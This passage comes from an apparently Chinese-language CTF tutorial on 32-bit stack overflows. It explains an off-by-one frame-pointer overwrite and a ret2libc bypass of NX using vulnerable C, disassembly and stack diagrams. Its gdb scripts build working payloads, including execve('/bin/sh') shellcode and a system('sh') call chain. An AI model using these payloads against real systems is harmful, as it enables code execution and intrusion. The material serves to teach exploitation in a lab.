        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                       +    <----    0x104   --->      +  ebx  +  ebp  +80491b1+ &a[1] +                                       +  ebp  +  Addr + &a[1] |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                       esp                                     ebp                                                             ebp       
        
        // 22-28 移动栈顶，将 argv[1] 的地址 0x8(%ebp) 以及 buf 的地址 -0x108(%ebp) 当参数压入栈中，然后调用 strcpy。调完后栈顶归位。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +       +  edx  + &a[1] +               +    <----    0x104   --->      +  ebx  +  ebp  +80491b1+ &a[1] +                                       +  ebp  +  Addr + &a[1] |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                       esp                             edx                                     ebp                                                             ebp       
                                                  -->  esp

        // 一般流程就是 bar 函数主体完事儿，在 leave 的时候，esp 指向 ebp，然后将 foo 的 ebp 弹出。继续执行 foo 中不受 ebp 影响的其他代码（所以有局限性），
        // 现在最主要的来了，当 foo 也要返回的时候，也会让 esp 指向 ebp，也就是我们刚才修改的那个 ebp 地址。接着 pop 一个无用的 ebp，接着就是我们可以操控的地址了。

        // 现在要想模拟单字节漏洞，就必须让 payload 压到 ebp 的脚才行。也就是构建 从 edx 开始的（0x104 + 0x4 + 0x1 = 265） 个字节。而且最后一个字节一般为`0x00（NULL）`。
        // 我们的目的是为了让最后一个字节为 0x00，可以直接设置，然后使用 264 个字符 达到同样的效果。

        // 假设 edx = 0x804cd40，原本的 ebp = 0x804ce68，则覆盖后的为 0x804ce00，也就是最多把 foo 中的 esp 劫持到这儿。
        // 按照如下构造，当 foo 执行 leave 的时候，esp = 0x804ce00，弹出无效 ebp 后，就开始按照我们给定的地址执行了。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                       +    <----    0x104   --->      +  ebx  +  ebp  +80491b1+ &a[1] +                                       +  ebp  +  Addr + &a[1] |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                       edx                                     ebp                                                             ebp       
                 _______________________________________/                                       \______________________________________
                /                                                                                                                      \
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         n byte +//////////////a(192 times)/////////////////////////////+         (4)ebp + (4)Addr +  (25)shell_code + (n)a             +
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
               edx(0x804cd40)                                       0x804ce00                                                        804CE48                0x804ce68
        ```
        <details><summary>script.gdb</summary>

        ```sh [data-file:script.gdb]
        # stack-protect attack script

        set debuginfod enabled off
        set confirm off
        set pagination off

        b *bar+35

        run  `printf 'a%.0s' {1..264};`

        print/x $edx
        echo \n

        set $low_zero = ((int)$edx+0x108 & (int)0xffffff00)
        set $prefix = $low_zero - $edx

        # 找到参数存储的地方，填充 shellcode
        set $fixed_argv = *($edx + 0x104 + 12)

        set {unsigned int}($fixed_argv + $prefix + 4) = $edx + $prefix + 8
        set {char[25]}($fixed_argv + $prefix + 8) = {0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80}

        x/4xw $edx+0x104
        echo \n
        b *bar+40
        c
        x/32xw $low_zero-8


        continue
        ```
        
        ![](/.images/corner/ctf/stack-overflow/04-off-by-one_01.gif ':size=99%')
        </details>

    + ### 绕过 NX 标志位（with return to libc | ret2libc）

        `gcc -g -m32 -I ./include -no-pie -fno-stack-protector src/vuln.c -o build/vuln`
        <br>`gdb -x script.gdb build/vuln`

        <!-- panels:start -->
        <!-- div:left-panel-50 -->
        ```c
        /*
         * https://sploitfun.wordpress.com/2015/05/08/bypassing-nx-bit-using-return-to-libc/
         * 
         * 
         * 
         * 
         * 
         * 
         * info sharedlibrary libc
         * p &system
         * echo "ibase=16;obase=10; ${(U):-f7d88000} +  ${(U):-0004f8e0} " | bc 
         *      ==> F7DD78E0 
         * echo "ibase=16;obase=10; ${(U):-8048000} +  ${(U):-2ac} " | bc
         *      ==> 80482AC
         * 
         * 
         * 
         * 
         * 
         * 
         * 
         * 
         * 
         * 
         */

        //vuln.c
        #include <stdio.h>
        #include <string.h>

        int main(int argc, char* argv[]) {

            char buf[12]; /* [1] */ 
            strcpy(buf,argv[1]); /* [2] */
            printf("%s\n",buf); /* [3] */
            fflush(stdout);  /* [4] */
            return 0;

        }
        ```
        <!-- div:right-panel-50 -->

        ```masm {2-9, 12-15, 22-26,33-39} [data-filter:35]
        08049186 <main>:
         8049186:       8d 4c 24 04             lea    0x4(%esp),%ecx
         804918a:       83 e4 f0                and    $0xfffffff0,%esp
         804918d:       ff 71 fc                push   -0x4(%ecx)
         8049190:       55                      push   %ebp
         8049191:       89 e5                   mov    %esp,%ebp
         8049193:       53                      push   %ebx
         8049194:       51                      push   %ecx
         8049195:       83 ec 10                sub    $0x10,%esp
         8049198:       e8 23 ff ff ff          call   80490c0 <__x86.get_pc_thunk.bx>
         804919d:       81 c3 57 2e 00 00       add    $0x2e57,%ebx
         80491a3:       89 c8                   mov    %ecx,%eax
         80491a5:       8b 40 04                mov    0x4(%eax),%eax
         80491a8:       83 c0 04                add    $0x4,%eax
         80491ab:       8b 00                   mov    (%eax),%eax
         80491ad:       83 ec 08                sub    $0x8,%esp
         80491b0:       50                      push   %eax
         80491b1:       8d 45 ec                lea    -0x14(%ebp),%eax
         80491b4:       50                      push   %eax
         80491b5:       e8 96 fe ff ff          call   8049050 <strcpy@plt>
         80491ba:       83 c4 10                add    $0x10,%esp
         80491bd:       83 ec 0c                sub    $0xc,%esp
         80491c0:       8d 45 ec                lea    -0x14(%ebp),%eax
         80491c3:       50                      push   %eax
         80491c4:       e8 97 fe ff ff          call   8049060 <puts@plt>
         80491c9:       83 c4 10                add    $0x10,%esp
         80491cc:       8b 83 fc ff ff ff       mov    -0x4(%ebx),%eax
         80491d2:       8b 00                   mov    (%eax),%eax
         80491d4:       83 ec 0c                sub    $0xc,%esp
         80491d7:       50                      push   %eax
         80491d8:       e8 63 fe ff ff          call   8049040 <fflush@plt>
         80491dd:       83 c4 10                add    $0x10,%esp
         80491e0:       b8 00 00 00 00          mov    $0x0,%eax
         80491e5:       8d 65 f8                lea    -0x8(%ebp),%esp
         80491e8:       59                      pop    %ecx
         80491e9:       5b                      pop    %ebx
         80491ea:       5d                      pop    %ebp
         80491eb:       8d 61 fc                lea    -0x4(%ecx),%esp
         80491ee:       c3                      ret
        ```
        <!-- panels:end -->

        ```sh
        // 刚进入 main 函数时的初始化状态
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                                                                               +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                                                                               esp
        // 2-9 行前奏
        // 有时候进入时 $esp = 0xffffcf7c，有时候为 0xffffcf6c，不影响最后一位都是 c， $0xfffffff0 & %esp 都会减少 12 个字节
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte +                                                                                       +  ecx  +  ebx  +  ebp  +  Addr +                       +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                       esp                                             ebp                                             ecx

        // 10-11 行跟原理演示中的一样，获取 .got.plt 的地址，赋值给 ebx 寄存器，为函数调用做准备。

        // 12-15 获取程序 argv[1] 的地址赋值给 eax

        // 16-21 移动栈顶，将 argv[1] 的地址和 buf 的地址 -0x14(%ebp) 当参数压入栈中，然后调用 strcpy。调完后栈顶归位。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte                         +  &buf + &a[1] +     $0x8      +                               +  ecx  +  ebx  +  ebp  +  Addr +                       +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                       esp                                                                             ebp                                             ecx
                                                                   --> esp

        // 22-26 移动栈顶，将 buf 的地址当参数压入栈中，然后调用 puts。调完后栈顶归位。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte                         + &buf  +        $0xc           +                               +  ecx  +  ebx  +  ebp  +  Addr +                       +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                       esp                                                                             ebp                                             ecx
                                                                   --> esp

        // 33-39 恢复函数调用现场，需要注意: <mark class='clever'>esp 指针是根据 ecx 的值来恢复的，所以 ecx 的值不可覆盖的</mark>。
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
         4 byte                                                                                         +  ecx  +  ebx  +  ebp  +  Addr +                       +  Addr + argc  + argv  |
        --------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------+-------
                                                                                                                                                               esp     ecx
        ```
        <details><summary>script.gdb</summary>

        ```sh [data-file:script.gdb]
        # stack-protect attack script

        set debuginfod enabled off
        set confirm off
        set pagination off

        b *main+4

        run  `printf 'a%.0s' {1..12}; printf '\x01\x01\x01\x01'; printf 'a%.0s' {1..24}; printf '\x01\x01\x01\x01'; printf 'argc'; printf 'b%.0s' {1..25};`

        # 0xffffcf7c
        print/x $esp

        b *main+47
        c
        x/32xw $eax
        echo \n

        set $ecx_flag = $ecx
        set $r_addr = $ecx + 4

        # 因为关闭了 ASLR，所以每次加载的地址固定，可以使用 `(gdb) info proc mappings` 看到 libc 的基址为 `0xf7d88000`
        # set $libc_base_addr  = 0xf7d88000
        # system 函数的地址，通过`ldd build/vuln` 确认 libc.so 路径，然后读取符号`readelf -s /lib32/libc.so.6 | grep system`获得偏移量 0004f8e0，
        # 最终计算`echo "ibase=16;obase=10; ${(U):-f7d88000} +  ${(U):-0004f8e0} " | bc` 得到实际地址为 F7DD78E0
        # 或者直接一步到位`(gdb) p &system`， exit 同理
        set $system_fun_addr = 0xf7dd78e0
        set $exit_fun_addr   = 0xf7dc65b0
        # 这个参数也就是引入`fflush(stdout);`的原因。可以在当前程序字符串表中找到`sh`。 通过`readelf -x .dynstr build/vuln`可以看到 sh 偏移量为 0x080482ac,
        set $system_arg      = 0x080482AC

        # 找到参数存储的地方，修复占位符 `\x01\x01\x01\x01`，构造调用 system 的栈结构（返回地址 + 参数）
        set $fixed_argv = *(*($ecx + 4) + 4)

        set {unsigned int}($fixed_argv + 12) = $ecx
        set {unsigned int}($fixed_argv + 40) = $system_fun_addr
        set {unsigned int}($fixed_argv + 44) = $exit_fun_addr
        set {unsigned int}($fixed_argv + 48) = $system_arg
        x/32xw $fixed_argv

        continue
        ```

        ![](/.images/corner/ctf/stack-overflow/05-return-to-libc_01.gif ':size=99%')
        </details>


* ## Reference

    + https://sploitfun.wordpress.com/2015/